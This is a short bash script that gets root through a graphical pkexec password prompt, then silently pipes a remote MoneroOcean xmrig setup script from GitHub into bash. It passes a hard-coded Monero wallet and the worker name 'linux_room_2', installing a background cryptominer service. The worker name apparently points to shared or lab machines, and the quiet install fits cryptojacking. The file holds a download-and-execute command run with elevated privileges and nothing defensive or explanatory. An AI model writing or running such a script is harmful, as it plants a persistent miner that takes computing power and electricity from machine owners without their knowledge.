#!/bin/bash

# This checks if the script has Administrator (root) privileges.
# If not, it triggers a graphical password popup instead of using the terminal.
if [ "$EUID" -ne 0 ]; then
  pkexec env DISPLAY=$DISPLAY XAUTHORITY=$XAUTHORITY bash "$0"
  exit
fi

# Configuration
WALLET="483dhPFGREDdXmHiC5gsPtMDxdbkPzSnn7MPCSLmwEiUHduGB8UffVAV8LTdZGe3mrGMoy9rHWyk1BmB9HRYNvEF2VuAYYv"
WORKER_NAME="linux_room_2"

# Installs the official MoneroOcean background service silently
curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s "$WALLET~$WORKER_NAME"
